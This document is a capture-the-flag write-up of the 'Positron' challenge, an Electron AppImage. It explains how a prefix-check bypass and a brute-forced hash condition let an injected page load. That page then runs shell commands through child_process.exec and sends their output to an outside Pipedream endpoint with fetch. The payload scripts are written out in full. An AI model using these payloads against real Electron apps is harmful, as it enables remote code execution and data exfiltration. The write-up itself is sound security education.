# Challenge 55 - Positron

The first impression we had seeing this challenge was, "Whoa, a challenge that touches all 5 domains. Gotta try it out!"

The link provided has an input field that allows a URL input. The submission form seems to suggest that this command will be run on the server:

```
/positron-1.0.0.AppImage --no-sandbox http://example.com
```

Positron sounds like a spin of Electron, the almost omnipresent way to make desktop apps with JavaScript. So we probably assume that this challenge could be similar.

And... AppImage is a way to package software in Linux environments (~~Kelvin: I think this is actually much better than Flatpaks or Snaps but well~~). It is portable and easy to use ([and apparently even liked by Linus Torvards](https://web.archive.org/web/20160205074927/https://plus.google.com/+LinusTorvalds/posts/WyrATKUnmrS)).

So let's download the AppImage and fiddle with it!

## Breaking It

Running it showed a helpful debug screen that we can use, and the `Show Flag` button was interesting. Once clicked -- surprise -- file not found. But we at least learned that the flag is in `flag.html`.

After an `--appimage-extract`, we then were presented a list of folders, of which `resources/` should be juiciest.

Extracting the `resources/app.asar` with [ASAR](https://github.com/electron/asar) exports a highly accurate IE logo artwork, together with an `index.js`, which we saw this very important snippet:

```javascript
app.on('ready', () => {
  const home = 'https://bl.ocks.org/positron-browser/raw/de363db7c6eae43a20a932753b1c29b4/';
  var url = process.argv[2] || home;
  var HashCash = Math.abs(require('crypto-js/sha256')(url).words[1])>>1<1<<11;
  if(!url.startsWith('https://bl.ocks.org/positron-browser') || !HashCash){
    url = home;
  }
  openWindow(url);
});
```

## Aha, URLs

We learned how the URLs are filtered. The `process.argv[2]` corresponds to inputs, but there are validations and not all submitted pages are graced with the arrival of the Positron.

We first verified whether the default `home` is the same as the default page from the AppImage. Going to `https://bl.ocks.org/positron-browser/raw/de363db7c6eae43a20a932753b1c29b4` confirmed it.

To make the AppImage load our payloads for exploits, the URL containing it has to satisfy the two criteria:

1. URL needs to starts with `https://bl.ocks.org/positron-browser`
2. the `HashCash` needs to be `false`

A quick visit to `bl.ocks.org` shows that it is in fact just a glorified frontend of Github Gist. But since we are not the owner of the account `positron-browser`, how can we possibly put our own code there?

Looking at the condition again more carefully, we noticed the string does not have the trailing slash. It is just `/positron-browser`, which means we can simply create any Github account that starts with `positron-browser`, e.g. `positron-browser-123456`, and it can satisfy Condition 1 easily. We then created a Gist with a dummy `index.html` file under a new Github account.

Onwards to Condition 2, `HashCash` checks the value of a SHA256'd "hash" and compares wiht a constant. By appending query string of the URL after `?` with a simple script, we now have a list of valid URLs for this condition.

```javascript
urlBase = 'https://bl.ocks.org/positron-browser-123456/raw/xxxxxx/?';
for (var i = 1000000; i <= 9999999; i++) {
  var url = `${urlBase}${i}`;
  var HashCash = Math.abs(require('crypto-js/sha256')(url).words[1])>>1<1<<11;
  if (HashCash) {
    console.log(url);
  }
}
```

## Exec Exposed

All things are set and it is ready to submit our own URL to the AppImage.

First we started off with a simple `fetch` call to an endpoint at Pipedream, which executed perfectly:

```html
<script>
fetch('https://xxxx.m.pipedream.net?test-positron');
</script>
```

Since the provided source `index.js` has (kindly) provided a "Show Flag" pointing to `flag.html`, we tried our luck there. However, this gives "File not found":

```html
<script>
fetch('flag.html')
    .then(response => response.text())
    .then(text => {
        fetch('https://xxxx.m.pipedream.net/?fetchflaghtml' + text);
    });
</script>
```

We also turned to other methods. How about try looking at what files are there in the directory? As seen from the sample default URL, there is one link that looks attractive to explore too: `<a href="file:///etc/passwd">Show Password</a>`. It was time to try look at the file system.

Knowing that Positron is in fact just a thin wrapper over Electron, we then set up an [Electron Fiddle](https://www.electronjs.org/fiddle) to test the scripts locally.

A quick search shows that there is an `exec` function available from the module `child_process`. Testing with a "Hello World" `exec` script:

```html
<script>
const { exec } = require('child_process');
exec('pwd', (error, stdout, stderr) => {
  fetch('https://xxxx.m.pipedream.net/?exec-error-' + error);
  fetch('https://xxxx.m.pipedream.net/?exec-stdout-' + stdout);
  fetch('https://xxxx.m.pipedream.net/?exec-stderr-' + stderr);
});
</script>
```

Running this locally gives the error `Uncaught ReferenceError: require is not defined`. [StackOverflow](https://stackoverflow.com/questions/44391448/electron-require-is-not-defined) suggested that `require` only works if `nodeIntegration` is enabled and `contextIsolation` is disabled when creating the `BrowserWindow`. The default values are naturally the opposite. In the default local fiddle, both are indeed not set by default in the main process `main.js` (StackOverflow also warned for the security risks for overriding these settings). To know whether `require` can be used on the server side's AppImage, we looked at the extracted `index.js` from the AppImage again, and both settings are there! It assured us this was the right direction to solve this problem.

## Flag Finding

Re-running with such settings worked locally, and on the server too. The next step would be to look at the files inside the same directory, `./`. by changing `'pwd'` to `'ls .'`

```html
<script>
fetch('https://xxxx.m.pipedream.net/?t=checkpoint'); // health check
const { exec } = require('child_process');
exec('ls .', (error, stdout, stderr) => {
    if (error) {
        fetch(`https://xxxx.m.pipedream.net/?t=error${encodeURIComponent(error)}`);
        return;
    }
    fetch(`https://xxxx.m.pipedream.net/?t=stdout${encodeURIComponent(stdout)}`);
    fetch(`https://xxxx.m.pipedream.net/?t=stderr${encodeURIComponent(stderr)}`);
});
</script>
```

Nothing there. Tried `printenv` to see if the flag is located inside the environment variables. Nothing either.

So we tried examining the root folder instead using `ls /`, and then we saw the file `/proof_b69de741-0a31-433b-b11a-d4400754a902.sh`. So we were just a `cat /proof_b69de741-0a31-433b-b11a-d4400754a902.sh` away from the flag. Solved!
